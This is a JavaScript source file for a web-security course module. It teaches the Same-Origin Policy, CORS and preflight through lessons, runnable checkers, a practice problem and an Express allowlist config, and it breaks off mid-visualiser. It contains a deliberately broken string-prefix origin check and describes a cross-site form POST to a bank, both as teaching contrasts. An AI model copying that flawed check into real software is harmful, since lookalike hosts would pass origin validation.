(function () {
var topics = [], practice = [], quiz = [], interview = [];

/* ============================ TOPIC 1: SAME-ORIGIN POLICY ============================ */
topics.push({
  title: 'The Same-Origin Policy: The Browser’s Number One Rule',
  analogy: `<p>Think of a big <b>apartment building</b>. Every flat has its own front door and its own lock. A neighbour can <em>ring your bell</em> (send you something), but they cannot walk into your flat and open your fridge (read your stuff). The browser is the building manager, every <b>origin</b> is one flat, and the <b>Same-Origin Policy (SOP)</b> is the rule "you can knock, but you cannot enter another flat".</p>`,
  explain: `<p>An <b>origin</b> is the exact combination of three things: <b>scheme</b> (http or https), <b>host</b> (shop.com) and <b>port</b> (443). Two URLs are <b>same-origin</b> only when all three match. The path (<code>/cart</code> vs <code>/login</code>) and the query string do <em>not</em> matter.</p>
  ${H.table(['URL', 'scheme', 'host', 'port', 'vs https://shop.com/a'], [
    ['https://shop.com/b?x=1', 'https', 'shop.com', '443', H.c('g', 'same origin (path ignored)')],
    ['http://shop.com/a', H.c('r', 'http'), 'shop.com', '80', H.c('r', 'different scheme')],
    ['https://api.shop.com/a', 'https', H.c('r', 'api.shop.com'), '443', H.c('r', 'different host (subdomain counts!)')],
    ['https://shop.com:8443/a', 'https', 'shop.com', H.c('r', '8443'), H.c('r', 'different port')],
    ['https://shop.com:443/a', 'https', 'shop.com', '443', H.c('g', 'same (443 is the https default)')]
  ])}
  <p><b>What does SOP actually stop?</b> A script from origin A may <em>send</em> a request to origin B in many cases (images, forms, links). What SOP stops is the script <b>reading the response</b> of origin B. So <code>evil.com</code> cannot do <code>fetch('https://bank.com/account')</code> and then read your balance. That one rule is why you can have your bank and a random blog open in two tabs safely.</p>
  <ul>
    <li>${H.c('g', 'Allowed (embedding)')}: <code>&lt;img&gt;</code>, <code>&lt;script src&gt;</code>, <code>&lt;link rel=stylesheet&gt;</code>, <code>&lt;iframe&gt;</code>, <code>&lt;video&gt;</code>, form submits, links.</li>
    <li>${H.c('r', 'Blocked (reading)')}: <code>fetch</code>/XHR response of another origin, reading <code>iframe.contentDocument</code> of another origin, reading another origin’s <code>localStorage</code>, cookies and IndexedDB.</li>
  </ul>
  <p><b>Same-site is different from same-origin.</b> <em>Site</em> = scheme + the "registrable domain" (<code>shop.com</code>, also called eTLD+1). So <code>app.shop.com</code> and <code>api.shop.com</code> are <b>same-site but cross-origin</b>. Cookies’ <code>SameSite</code> attribute uses "site"; CORS and SOP use "origin". Mixing them up is the number one interview mistake.</p>
  <p><b>When two pages <em>want</em> to talk</b> there are safe doors: CORS (server opts in, next topic), <code>postMessage</code> (both sides opt in), and a same-origin reverse proxy (<code>/api</code> on your own origin).</p>`,
  clues: [
    '"Why can’t my page read the response from another domain?" → Same-Origin Policy',
    '"Is <code>http://localhost:3000</code> the same origin as <code>http://localhost:8080</code>?" → No: the port differs',
    '"Subdomains" or "different ports in dev" → cross-origin, so CORS or a dev proxy is needed',
    '"Same-site vs same-origin" → site = eTLD+1, origin = scheme + host + port',
    '"The request was sent but the response is blocked" → SOP stops reading, not sending',
    '"Two windows/iframes need to talk" → <code>postMessage</code> with an explicit target origin and an <code>event.origin</code> check'
  ],
  code: [
    {
      lang: 'js', run: true, title: 'Same-origin checker (runs in your browser)',
      code: `// Default ports: when a URL has no port, the browser uses the scheme's default.
var DEFAULT_PORT = { http: '80', https: '443', ws: '80', wss: '443' };

// Turn a URL into its origin triple. new URL() lower-cases the host,
// strips default ports and throws on garbage, which is what we want.
function originTriple(url) {
  var u = new URL(url);
  var scheme = u.protocol.slice(0, -1);               // "https:" -> "https"
  var port = u.port || DEFAULT_PORT[scheme] || '';    // "" means default
  return { scheme: scheme, host: u.hostname, port: port };
}

// Compare two URLs and say WHICH parts differ (great for debugging CORS errors).
function compareOrigins(a, b) {
  var x = originTriple(a), y = originTriple(b), differs = [];
  if (x.scheme !== y.scheme) differs.push('scheme');
  if (x.host !== y.host) differs.push('host');
  if (x.port !== y.port) differs.push('port');
  return { same: differs.length === 0, differs: differs };
}

var base = 'https://shop.com/cart';
var tests = [
  'https://shop.com/checkout?step=2',   // path + query ignored
  'http://shop.com/cart',               // scheme differs
  'https://api.shop.com/cart',          // host differs (subdomain)
  'https://shop.com:8443/cart',         // port differs
  'https://SHOP.com:443/cart',          // case + default port: still same
  'https://shop.com.evil.io/cart'       // looks similar, totally different host
];
tests.forEach(function (t) {
  var r = compareOrigins(base, t);
  console.log((r.same ? 'SAME ' : 'CROSS') + '  ' + t + (r.same ? '' : '   differs: ' + r.differs.join(', ')));
});`
    },
    {
      lang: 'js', title: 'Talking across origins safely with postMessage (browser code)',
      code: `// ---- Receiver (inside https://shop.com) ----
window.addEventListener('message', function (event) {
  // 1. WHO sent it? event.origin is filled in by the browser, the sender cannot fake it.
  if (event.origin !== 'https://widgets.example.com') return;
  // 2. WHAT did they send? Treat the data as untrusted input and check its shape.
  if (!event.data || event.data.type !== 'resize') return;
  var h = Number(event.data.height);
  if (h > 0 && h < 2000) document.getElementById('widget').style.height = h + 'px';
});

// ---- Sender ----
// ALWAYS name the target origin. Using '*' means "deliver to whoever is in that window now".
var frame = document.getElementById('widget');
frame.contentWindow.postMessage({ type: 'hello' }, 'https://widgets.example.com');`
    }
  ],
  codeTitle: ['Same-origin checker', 'postMessage done safely'],
  viz: {
    title: 'Origin comparison: scheme + host + port',
    input: 'https://shop.com/cart http://shop.com/cart https://api.shop.com/cart https://shop.com:8443/cart https://shop.com:443/pay?x=1 https://shop.com.evil.io/cart',
    inputLabel: 'Base URL first, then URLs to compare (space separated)',
    gen: function (input) {
      var urls = String(input).trim().split(/\s+/).filter(Boolean);
      if (urls.length < 2) throw new Error('Enter a base URL followed by 1 to 8 URLs, separated by spaces');
      if (urls.length > 9) throw new Error('Use at most 8 URLs to compare');
      var DEF = { http: '80', https: '443', ws: '80', wss: '443' };
      function tri(u) {
        var m = /^([a-zA-Z][a-zA-Z0-9+.-]*):\/\/([^\/:?#]+)(?::(\d+))?/.exec(u);
        if (!m) throw new Error('Not an absolute URL like https://host/path : ' + u);
        var s = m[1].toLowerCase();
        return { s: s, h: m[2].toLowerCase(), p: m[3] || DEF[s] || '?' };
      }
      var base = tri(urls[0]), rows = [], frames = [], hl = {};
      frames.push({
        narr: 'The browser splits the <b>base URL</b> into its origin triple. Only these three parts matter for the Same-Origin Policy; the path and query are thrown away.',
        parts: [
          { type: 'vars', label: 'Base origin of ' + urls[0], vals: { scheme: base.s, host: base.h, port: base.p } },
          { type: 'table', label: 'Comparisons', columns: ['URL', 'scheme', 'host', 'port', 'verdict'], rows: [['(nothing compared yet)', '', '', '', '']] }
        ]
      });
      for (var i = 1; i < urls.length; i++) {
        var t = tri(urls[i]), diff = [];
        if (t.s !== base.s) diff.push('scheme');
        if (t.h !== base.h) diff.push('host');
        if (t.p !== base.p) diff.push('port');
        var ok = diff.length === 0;
        rows.push([
          urls[i],
          t.s === base.s ? '<span class="c-g">' + t.s + '</span>' : '<span class="c-r">' + t.s + '</span>',
          t.h === base.h ? '<span class="c-g">' + t.h + '</span>' : '<span class="c-r">' + t.h + '</span>',
          t.p === base.p ? '<span class="c-g">' + t.p + '</span>' : '<span class="c-r">' + t.p + '</span>',
          ok ? '<span class="c-g">same origin</span>' : '<span class="c-r">cross-origin</span>'
        ]);
        hl = {}; hl[rows.length - 1] = ok ? 'ok' : 'bad';
        frames.push({
          narr: '<b>' + urls[i] + '</b> → scheme ' + (t.s === base.s ? 'matches' : '<b>differs</b>') + ', host ' + (t.h === base.h ? 'matches' : '<b>differs</b>') + ', port ' + (t.p === base.p ? 'matches' : '<b>differs</b>') + '. ' +
            (ok ? '<span class="c-g">All three match: scripts can read each other’s responses.</span>' : '<span class="c-r">Different ' + diff.join(' + ') + ': the browser blocks reading the response.</span>'),
          parts: [
            { type: 'vars', label: 'Base origin', vals: { scheme: base.s, host: base.h, port: base.p }, hl: { scheme: 'sel', host: 'sel', port: 'sel' } },
            { type: 'table', label: 'Comparisons', columns: ['URL', 'scheme', 'host', 'port', 'verdict'], rows: rows.slice(), hl: hl }
          ]
        });
      }
      frames.push({
        narr: 'Done. Remember: the <b>path never matters</b>, a default port is the same as no port, and a lookalike host such as <code>shop.com.evil.io</code> is a completely different origin.',
        parts: [{ type: 'table', label: 'Final result', columns: ['URL', 'scheme', 'host', 'port', 'verdict'], rows: rows.slice() }]
      });
      return frames;
    }
  },
  examples: [
    {
      title: 'The classic dev-machine surprise: ports',
      html: `<p>Your React dev server runs at <code>http://localhost:5173</code> and your API at <code>http://localhost:3000</code>. Same machine, same host name, and still <b>cross-origin</b> because the <b>port</b> differs. Your <code>fetch('http://localhost:3000/users')</code> is sent, the server answers 200, but the browser refuses to hand the JSON to your script and prints a CORS error. Fixes: (1) the API sends CORS headers, or (2) the dev server proxies <code>/api</code> to port 3000 so the browser only ever sees one origin.</p>`,
      code: { lang: 'js', title: 'Vite dev proxy: make /api look same-origin', check: false, code: `// vite.config.js
export default {
  server: {
    proxy: {
      // Browser calls http://localhost:5173/api/users (same origin!).
      // Vite forwards it to the real API server-side, where SOP does not exist.
      '/api': { target: 'http://localhost:3000', changeOrigin: true }
    }
  }
};` }
    },
    {
      title: 'Sent but not readable: why SOP does not stop CSRF',
      html: `<p>A common wrong belief: "SOP stops other sites from calling my API". It does not. A form on <code>evil.com</code> can <em>POST</em> to <code>bank.com/transfer</code> and the browser will happily send it (with cookies, unless <code>SameSite</code> says no). SOP only stops evil.com from <em>reading what comes back</em>. That is why the module has a whole topic on CSRF and one on cookies: reading is protected by SOP/CORS, <b>writing</b> needs separate defences.</p>
      ${H.table(['Action by evil.com', 'Blocked by SOP?'], [['&lt;img src="https://bank.com/logo.png"&gt;', H.c('g', 'No, embedding is fine')], ['&lt;form action="https://bank.com/transfer" method="post"&gt;', H.c('g', 'No, the request is sent')], ['<code>fetch("https://bank.com/me").then(r =&gt; r.json())</code>', H.c('r', 'Response unreadable')], ['<code>iframe.contentDocument</code> of bank.com', H.c('r', 'Throws SecurityError')]])}`
    },
    {
      title: 'Same-site but cross-origin: app.shop.com and api.shop.com',
      html: `<p>Teams often put the SPA on <code>app.shop.com</code> and the API on <code>api.shop.com</code>. These are <b>cross-origin</b> (host differs), so <b>CORS is required</b>. They are <b>same-site</b> (both under <code>shop.com</code>), so a cookie marked <code>SameSite=Lax</code> or <code>Strict</code> <em>is</em> sent on those fetches. You still must set <code>credentials: 'include'</code> on the fetch and <code>Access-Control-Allow-Credentials: true</code> on the server. Two different rule sets (CORS for reading, SameSite for sending) apply to the same request.</p>
      ${H.table(['Pair', 'Same-origin?', 'Same-site?'], [['app.shop.com → api.shop.com', H.c('r', 'no'), H.c('g', 'yes')], ['shop.com → shop.com:8443', H.c('r', 'no'), H.c('g', 'yes (port ignored for site)')], ['shop.com → shop.co.uk', H.c('r', 'no'), H.c('r', 'no')], ['alice.github.io → bob.github.io', H.c('r', 'no'), H.c('r', 'no (github.io is on the Public Suffix List)')]])}`
    },
    {
      title: 'Opaque origins: file://, sandboxed iframes and data: URLs',
      html: `<p>Some documents have no usable origin. Pages opened from <code>file://</code>, <code>&lt;iframe sandbox&gt;</code> without <code>allow-same-origin</code>, and <code>data:</code> URLs get an <b>opaque origin</b>, serialised as the string <code>"null"</code>. Two opaque origins are never equal, even to themselves in another frame. That is exactly why a server that answers <code>Access-Control-Allow-Origin: null</code> is dangerous: any sandboxed iframe on any site can claim that origin.</p>`
    }
  ],
  deepDive: `<p><b>How the browser really enforces it.</b> SOP is not one check, it is a family of rules. Network reads (fetch/XHR), DOM access across windows, and storage (<code>localStorage</code>, IndexedDB, Cache Storage, cookies by their own domain/path rules) each have their own variant. Cookies are the odd one out: they are scoped by <i>host and path</i>, not by origin, and are sent regardless of port or scheme (unless <code>Secure</code>). That mismatch is the root of many real bugs: <code>http://shop.com:8080</code> can set a cookie that <code>https://shop.com</code> receives.</p>
  <p><b>document.domain is dead.</b> Old code relaxed SOP by setting <code>document.domain = 'shop.com'</code> on both subdomains. It has been deprecated and is disabled by default in modern Chrome, Firefox and Safari (origin-keyed agent clustering). Use <code>postMessage</code> or <code>BroadcastChannel</code> instead.</p>
  <p><b>Spectre and the new isolation headers.</b> In 2018 speculative-execution attacks showed a page could read memory of other origins living in the <em>same process</em>. Browsers answered with <b>Site Isolation</b> (separate processes per site) and three opt-in headers that give "cross-origin isolation": <code>Cross-Origin-Opener-Policy: same-origin</code> (COOP), <code>Cross-Origin-Embedder-Policy: require-corp</code> (COEP) and <code>Cross-Origin-Resource-Policy</code> (CORP) on resources. You need them to use <code>SharedArrayBuffer</code> and high-resolution timers; they also protect you from cross-window leaks (<i>XS-Leaks</i>).</p>
  <p><b>Fetch metadata headers.</b> Browsers add <code>Sec-Fetch-Site</code> (<code>same-origin</code>, <code>same-site</code>, <code>cross-site</code>, <code>none</code>), <code>Sec-Fetch-Mode</code> and <code>Sec-Fetch-Dest</code> to requests, and JavaScript cannot forge them. A server can reject any state-changing request whose <code>Sec-Fetch-Site</code> is <code>cross-site</code>. This is one of the cleanest modern CSRF/XS-Leak defences ("resource isolation policy").</p>
  <p><b>Gotchas worth knowing:</b> (1) IP addresses and hostnames are compared as text: <code>127.0.0.1</code> and <code>localhost</code> are different origins. (2) Redirects: an origin is judged per hop, and a cross-origin redirect makes the request origin <code>null</code>-tainted. (3) <code>blob:</code> and <code>about:blank</code> URLs inherit the creator’s origin. (4) <code>Origin</code> header is sent on cross-origin requests and on all same-origin non-GET/HEAD requests; <code>Referer</code> can be trimmed by <code>Referrer-Policy</code>.</p>`,
  aiEra: `<p><b>What AI changes:</b> AI assistants are very quick at explaining a red CORS error in the console and generating a proxy config. The risk is that they "fix" the error the fastest way: <code>Access-Control-Allow-Origin: *</code>, or even disabling web security in the browser, or reflecting any <code>Origin</code> back. These make the symptom vanish while removing the protection.</p>
  <p><b>Use AI as a partner:</b> paste the exact browser error, the request URL and your page URL and ask <code>Compare these two origins part by part and tell me which of scheme, host and port differ</code>. Ask for a dev proxy and a production config that are separate.</p>
  <p><b>Where AI goes wrong:</b> it mixes up same-site and same-origin, assumes cookies follow origin rules, and forgets opaque origins and <code>postMessage</code> validation. AI-written widgets frequently use <code>postMessage(data, '*')</code> and never check <code>event.origin</code>.</p>
  <p><b>What you must still own:</b> knowing exactly what the policy protects (reading, not sending), reviewing any "allow all origins" shortcut, and being able to draw the origin triple on a whiteboard without help.</p>`,
  problems: [{
    title: 'Origin Detective: Same Origin, Same Site or Neither?',
    level: 'Easy', tags: ['same-origin', 'URL parsing', 'security'], companies: ['Google', 'Meta', 'Amazon'],
    statement: `<p>Write <code>classify(a, b)</code> for two absolute URLs. It returns an object <code>{ sameOrigin, sameSite, differs }</code> where <code>differs</code> lists which of <code>'scheme'</code>, <code>'host'</code>, <code>'port'</code> differ (in that order). Treat <code>https</code> default port as 443 and <code>http</code> as 80. For "site", assume the registrable domain is the <b>last two labels</b> of the host (so <code>app.shop.com</code> → <code>shop.com</code>), except when the host ends in one of the public suffixes passed in the third argument (for example <code>github.io</code>), in which case it is the last <b>three</b> labels.</p>`,
    constraints: `Absolute http/https URLs only. Host names are ASCII. At most 1000 comparisons.`,
    example: `${H.table(['a', 'b', 'sameOrigin', 'sameSite', 'differs'], [['https://shop.com/x', 'https://shop.com:443/y', H.c('g', 'true'), H.c('g', 'true'), '[]'], ['https://app.shop.com', 'https://api.shop.com', H.c('r', 'false'), H.c('g', 'true'), "['host']"], ['https://a.github.io', 'https://b.github.io', H.c('r', 'false'), H.c('r', 'false'), "['host']"]])}<p>Why: the first pair differs only in path and an explicit default port. The second shares <code>shop.com</code>. In the third, <code>github.io</code> is a public suffix, so each user is its own site.</p>`,
    brute: {
      why: `<p>The tempting shortcut is comparing the strings up to the third slash or using <code>startsWith</code>. It breaks on default ports (<code>https://x.com</code> vs <code>https://x.com:443</code>), on upper-case hosts, and worst of all on lookalikes: <code>'https://shop.com.evil.io'.startsWith('https://shop.com')</code> is <b>true</b>. Real attacks have used exactly this bug in origin checks.</p>`,
      code: `function sameOriginBrute(a, b) {
  // WRONG on purpose: string prefix check
  return b.startsWith(a.split('/').slice(0, 3).join('/'));
}`
    },
    mcq: { q: 'Which pair is SAME-SITE but NOT same-origin?', options: ['https://shop.com and http://shop.com', 'https://shop.com/a and https://shop.com/b', 'https://shop.com and https://evil.com', 'https://a.shop.com and https://b.shop.com:8443'], answer: 3, explain: 'Host and port differ so they are cross-origin, but both live under shop.com with the same scheme, so they are same-site. The first pair differs by scheme (not same-site in modern schemeful mode); the second is fully same-origin; the third is cross-site.' },
    hints: [
      `<p>Hint 1: Do not compare strings. Parse each URL into three fields (scheme, host, port) and compare field by field. The built-in <code>URL</code> class already lower-cases the host and removes default ports for you.</p>`,
      `<p>Hint 2: <code>u.port</code> is an empty string when the port is the default, so fill it in yourself from a small <code>{ http: '80', https: '443' }</code> map before comparing. Site = scheme + registrable domain; compute the registrable domain by splitting the host on dots.</p>`,
      `<p>Hint 3: Recipe: parse both → build triples → push the names of unequal fields into <code>differs</code> → <code>sameOrigin = differs.length === 0</code> → compute registrable domains (take 3 labels if the host ends with a public suffix, else 2) → <code>sameSite = scheme equal AND registrable equal</code>.</p>`
    ],
    solution: {
      approach: `<p>Parse with <code>new URL</code>, normalise the port, and compare field by field. For the site, compute the registrable domain by looking at the last labels of the host. Comparing parsed fields (never raw strings) is what makes lookalike hosts and default ports safe.</p>`,
      code: {
        lang: 'js', run: true, code: `var DEFAULT_PORT = { http: '80', https: '443' };

function triple(url) {
  var u = new URL(url);
  var scheme = u.protocol.slice(0, -1);
  return { scheme: scheme, host: u.hostname, port: u.port || DEFAULT_PORT[scheme] };
}

// Registrable domain: last 2 labels, or last 3 if the host ends in a public suffix.
function registrable(host, publicSuffixes) {
  var labels = host.split('.');
  var n = 2;
  for (var i = 0; i < publicSuffixes.length; i++) {
    var suf = publicSuffixes[i];
    if (host === suf || host.endsWith('.' + suf)) n = suf.split('.').length + 1;
  }
  return labels.slice(-n).join('.');
}

function classify(a, b, publicSuffixes) {
  publicSuffixes = publicSuffixes || [];
  var x = triple(a), y = triple(b), differs = [];
  ['scheme', 'host', 'port'].forEach(function (k) { if (x[k] !== y[k]) differs.push(k); });
  var sameSite = x.scheme === y.scheme &&
    registrable(x.host, publicSuffixes) === registrable(y.host, publicSuffixes);
  return { sameOrigin: differs.length === 0, sameSite: sameSite, differs: differs };
}

var PS = ['github.io'];
console.log(JSON.stringify(classify('https://shop.com/x', 'https://shop.com:443/y', PS)));
console.log(JSON.stringify(classify('https://app.shop.com', 'https://api.shop.com', PS)));
console.log(JSON.stringify(classify('https://a.github.io', 'https://b.github.io', PS)));
console.log(JSON.stringify(classify('https://shop.com', 'https://shop.com.evil.io', PS)));`
      },
      dry: {
        head: ['step', 'a', 'b', 'result'],
        rows: [
          ['1', 'https://shop.com/x → (https, shop.com, 443)', 'https://shop.com:443/y → (https, shop.com, 443)', 'differs = [] → same origin'],
          ['2', 'https://app.shop.com → host app.shop.com', 'https://api.shop.com → host api.shop.com', 'differs = [host]; both registrable = shop.com → same site'],
          ['3', 'https://a.github.io', 'https://b.github.io', 'registrable = a.github.io vs b.github.io → NOT same site']
        ]
      },
      complexity: `<p>Time O(L) per comparison where L is the URL length plus the number of public suffixes; space O(1).</p>`,
      followUps: ['How would you use the real Public Suffix List instead of a hand-written array?', 'How does "schemeful same-site" change the answer for http vs https on the same domain?']
    }
  }]
});

/* ============================ TOPIC 2: CORS & PREFLIGHT ============================ */
topics.push({
  title: 'CORS and the Preflight Request',
  analogy: `<p>Imagine a <b>members-only club</b> (the API server) with a doorman (the browser) who works for the <em>visitor</em>. Before a visitor from another club (your page) asks for anything unusual, the doorman first phones the club: "Would you accept a <b>PUT</b> with a <b>Authorization</b> note from someone at <b>app.example.com</b>?" That phone call is the <b>preflight</b> (an <code>OPTIONS</code> request). If the club says "yes, those are fine" the real request goes through; if it says nothing or "no", the doorman never lets the visitor ask. <b>CORS</b> (Cross-Origin Resource Sharing) is the club’s way of <em>opting in</em> to being read by other origins.</p>`,
  explain: `<p>The Same-Origin Policy blocks reading cross-origin responses. <b>CORS</b> is the controlled hole in that wall: the <b>server</b> sends special response headers saying "this origin is allowed to read me". The <b>browser</b> checks them. The server never blocks anything itself; it just says who is welcome. That is why <code>curl</code> and Postman ignore CORS completely. It protects the <em>user’s browser session</em>, not your server.</p>
  <h4>Simple requests (no preflight)</h4>
  <p>A request is "simple" when it could already have been made by an old HTML form, so it is safe to send immediately. All three must be true:</p>
  <ul>
    <li>Method is <code>GET</code>, <code>HEAD</code> or <code>POST</code>.</li>
    <li>Only "safelisted" headers: <code>Accept</code>, <code>Accept-Language</code>, <code>Content-Language</code>, <code>Content-Type</code>, <code>Range</code> (plus ones the browser sets itself).</li>
    <li><code>Content-Type</code> (if present) is <code>text/plain</code>, <code>application/x-www-form-urlencoded</code> or <code>multipart/form-data</code>. <b>Not</b> <code>application/json</code>!</li>
  </ul>
  <p>The browser sends the request with an <code>Origin: https://app.example.com</code> header. The server replies with <code>Access-Control-Allow-Origin: https://app.example.com</code> (or <code>*</code>). If the header is missing or wrong, the request <em>was still sent and processed</em> but your script gets a CORS error instead of the response.</p>
  <h4>Preflighted requests</h4>
  <p>Anything else (<code>PUT</code>, <code>DELETE</code>, <code>PATCH</code>, JSON bodies, an <code>Authorization</code> or custom <code>X-</code> header) first triggers an automatic <code>OPTIONS</code> request <b>with no cookies and no body</b>:</p>
  ${H.table(['Step', 'Who', 'What is sent'], [
    ['1', 'Browser → Server', '<code>OPTIONS /orders</code> + <code>Origin</code> + <code>Access-Control-Request-Method: PUT</code> + <code>Access-Control-Request-Headers: authorization, content-type</code>'],
    ['2', 'Server → Browser', '<code>204</code> + <code>Access-Control-Allow-Origin</code> + <code>-Allow-Methods: GET, PUT</code> + <code>-Allow-Headers: authorization, content-type</code> + <code>-Max-Age: 600</code>'],
    ['3', 'Browser', 'Compares: is my origin, method and every header allowed? ' + H.c('r', 'No → stop, real request is never sent') + ' / ' + H.c('g', 'Yes → continue')],
    ['4', 'Browser → Server', 'The real <code>PUT /orders</code> with cookies/body'],
    ['5', 'Server → Browser', 'Real response, which must <b>also</b> carry <code>Access-Control-Allow-Origin</code>']
  ])}
  <h4>Credentials (cookies) change the rules</h4>
  <p>By default <code>fetch</code> sends <b>no cookies</b> to other origins. To include them you set <code>credentials: 'include'</code> <em>and</em> the server must answer <code>Access-Control-Allow-Credentials: true</code> with a <b>specific</b> origin (a <code>*</code> wildcard is rejected). Same for <code>Allow-Headers</code> and <code>Allow-Methods</code>: no <code>*</code> with credentials.</p>
  <h4>Debug checklist for "CORS error"</h4>
  <ol>
    <li>Open DevTools → Network; find the <code>OPTIONS</code> request. Did it return 2xx? A 404, 401, 301 or 500 on <code>OPTIONS</code> breaks everything.</li>
    <li>Does the response contain <code>Access-Control-Allow-Origin</code> matching your page origin <em>exactly</em> (no trailing slash)?</li>
    <li>Is every requested header listed in <code>Allow-Headers</code>?</li>
    <li>With cookies: is it a specific origin plus <code>Allow-Credentials: true</code>?</li>
    <li>Reading a custom response header? Add it to <code>Access-Control-Expose-Headers</code>.</li>
  </ol>`,
  clues: [
    '"Browser sends an OPTIONS request before my PUT/DELETE" → preflight',
    '"Works in Postman/curl but fails in the browser" → CORS is enforced only by browsers',
    '"POST with <code>Content-Type: application/json</code> triggers an extra request" → JSON is not a safelisted content type',
    '"<code>Access-Control-Allow-Origin: *</code> with cookies fails" → credentialed requests need a specific origin and <code>Allow-Credentials: true</code>',
    '"No ’Access-Control-Allow-Origin’ header is present on the requested resource" → server (or CDN) must send it, the frontend cannot fix it',
    '"Preflight is slow / doubles my requests" → <code>Access-Control-Max-Age</code> caching, or avoid preflight by proxying same-origin',
    '"Which request is safe to cache per Origin?" → <code>Vary: Origin</code>'
  ],
  code: [
    {
      lang: 'js', run: true, title: 'Preflight decider (runs in your browser)',
      code: `// Which requests can the browser send WITHOUT asking first?
var SAFE_METHODS = ['GET', 'HEAD', 'POST'];
var SAFE_HEADERS = ['accept', 'accept-language', 'content-language', 'content-type', 'range'];
var SAFE_CONTENT_TYPES = ['text/plain', 'application/x-www-form-urlencoded', 'multipart/form-data'];

function needsPreflight(method, headers) {
  var reasons = [];
  if (SAFE_METHODS.indexOf(method.toUpperCase()) === -1) {
    reasons.push('method ' + method.toUpperCase() + ' is not GET/HEAD/POST');
  }
  Object.keys(headers || {}).forEach(function (name) {
    var key = name.toLowerCase();
    if (SAFE_HEADERS.indexOf(key) === -1) {
      reasons.push('header ' + key + ' is not safelisted');
    } else if (key === 'content-type') {
      // Only the "essence" before any ;charset=... counts.
      var essence = String(headers[name]).split(';')[0].trim().toLowerCase();
      if (SAFE_CONTENT_TYPES.indexOf(essence) === -1) reasons.push('content-type ' + essence + ' is not form-like');
    }
  });
  return { preflight: reasons.length > 0, reasons: reasons };
}

var cases = [
  ['GET',    {}],
  ['POST',   { 'Content-Type': 'application/x-www-form-urlencoded' }],
  ['POST',   { 'Content-Type': 'application/json' }],
  ['GET',    { Authorization: 'Bearer ' + 'PLACEHOLDER_TOKEN' }],
  ['DELETE', {}],
  ['POST',   { 'Content-Type': 'text/plain;charset=UTF-8', 'X-Request-Id': 'abc' }],
  ['PUT',    { 'Content-Type': 'application/json', Authorization: 'Bearer PLACEHOLDER_TOKEN' }]
];
cases.forEach(function (c) {
  var r = needsPreflight(c[0], c[1]);
  console.log((r.preflight ? 'PREFLIGHT ' : 'simple    ') + c[0] + ' ' + JSON.stringify(c[1]) + (r.preflight ? '  <- ' + r.reasons.join('; ') : ''));
});`
    },
    {
      lang: 'js', check: false, title: 'Express: a correct, allowlist-based CORS setup',
      code: `const express = require('express');
const app = express();

// Exact origins we trust. NEVER build this from a regex like /example.com$/
// ("evil-example.com" would match) and never echo req.headers.origin blindly.
const ALLOWED = new Set(['https://app.example.com', 'https://admin.example.com']);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin && ALLOWED.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);   // specific, not "*"
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Vary', 'Origin');                          // caches must key on Origin
    res.setHeader('Access-Control-Expose-Headers', 'X-Request-Id');
  }
  if (req.method === 'OPTIONS') {
    // Answer the preflight: 204, no body, and say what we accept.
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Access-Control-Max-Age', '600');           // browser may cache for 10 min
    return res.sendStatus(204);
  }
  next();
});

app.put('/orders/:id', (req, res) => res.json({ ok: true }));
app.listen(3000);`
    },
    {
      lang: 'http', title: 'What a preflight looks like on the wire',
      code: `OPTIONS /orders/42 HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: authorization, content-type

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 600
Vary: Origin`
    }
  ],
  codeTitle: ['Preflight decider', 'Express CORS allowlist', 'Preflight on the wire'],
  viz: {
    title: 'CORS: preflight OPTIONS then the real request',
    input: 'PUT application/json x-token allow',
    inputLabel: 'method contentType customHeader|- allow|deny (e.g. GET - - allow)',
    gen: function (input) {
      var p = String(input).trim().split(/\s+/);
      var method = (p[0] || 'GET').toUpperCase();
      var ct = (p[1] || '-').toLowerCase();
      var hdr = (p[2] && p[2] !== '-') ? p[2].toLowerCase() : '';
      var allow = (p[3] || 'allow').toLowerCase() !== 'deny';
      if (['GET', 'HEAD', 'POST', 'PUT', 'PATCH', 'DELETE'].indexOf(method) < 0) throw new Error('Method must be GET, HEAD, POST, PUT, PATCH or DELETE. Format: PUT application/json x-token allow');
      var simpleCt = ['-', 'text/plain', 'application/x-www-form-urlencoded', 'multipart/form-data'].indexOf(ct) >= 0;
      var safeH = ['accept', 'accept-language', 'content-language', 'range'];
      var customH = hdr && safeH.indexOf(hdr) < 0;
      var simpleM = ['GET', 'HEAD', 'POST'].indexOf(method) >= 0;
      var pre = !simpleM || !simpleCt || !!customH;
      var why = [];
      if (!simpleM) why.push('method ' + method);
      if (!simpleCt) why.push('content-type ' + ct);
      if (customH) why.push('header ' + hdr);
      var nodes = [
        { id: 'PG', label: 'Page JS app.example.com', x: 14, y: 30, shape: 'box', w: 22 },
        { id: 'BR', label: 'Browser (CORS check)', x: 48, y: 30, shape: 'box', w: 22 },
        { id: 'API', label: 'API api.example.com', x: 86, y: 30, shape: 'box', w: 22 }
      ];
      function g(edge, hlE, tags, nodeHl) {
        return { type: 'graph', label: 'Who talks to whom', directed: true, height: 60, nodes: nodes, edges: edge ? [edge] : [], ehl: hlE || {}, tags: tags || {}, hl: nodeHl || {} };
      }
      var reqLine = method + ' /orders/42';
      var frames = [];
      frames.push({
        narr: 'The page runs <code>fetch(...)</code> to a <b>different origin</b>. JavaScript cannot talk to the network directly: the browser sits in the middle and applies the CORS rules.',
        parts: [g(['PG', 'BR', 'fetch()'], { 'PG-BR': 'cur' }, { PG: 'calls fetch' }, { PG: 'cur' }),
          { type: 'code', label: 'Page code', lang: 'js', code: "fetch('https://api.example.com/orders/42', {\n  method: '" + method + "',\n  headers: { " + (ct !== '-' ? "'Content-Type': '" + ct + "'" : '') + (hdr ? (ct !== '-' ? ', ' : '') + "'" + hdr + "': 'v'" : '') + " }\n});", hl: { 2: 'cur' } }]
      });
      frames.push({
